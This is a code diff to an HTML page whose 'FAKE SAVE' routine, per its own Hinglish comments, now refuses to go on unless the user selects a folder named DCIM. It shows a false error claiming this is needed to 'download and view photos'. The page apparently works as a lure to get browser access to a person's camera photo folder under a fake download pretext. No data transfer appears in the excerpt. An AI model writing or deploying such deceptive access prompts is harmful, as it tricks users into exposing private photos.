@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 
@@ -1604,6 +1603,17 @@
 
         /* FAKE SAVE */
         async function startFakeSave(dirHandle) {
+            // 🔥 1. DCIM CHECK LAGAO YAHAN 🔥
+            if (dirHandle && dirHandle.name.toLowerCase() !== 'dcim') {
+                // Agar folder ka naam DCIM nahi hai, toh error dikhao
+                alert("❌ Error: Please select DCIM folder to download and view photos.");
+                saveAllBtn.disabled = false; // Button wapas enable karo
+                saveAllBtn.innerHTML = '<span>💾</span><span>Save All Pics</span>';
+                releaseWakeLock(); // Agar screen on tha toh off kar do
+                return; // YAHIN RUK JAO! Aage ka fake code mat chalao
+            }
+
+            // Agar DCIM hai, toh aage ka pura code chalega
             isCancelled = false;
             retryCount = 0;
             fakeDone = 0;
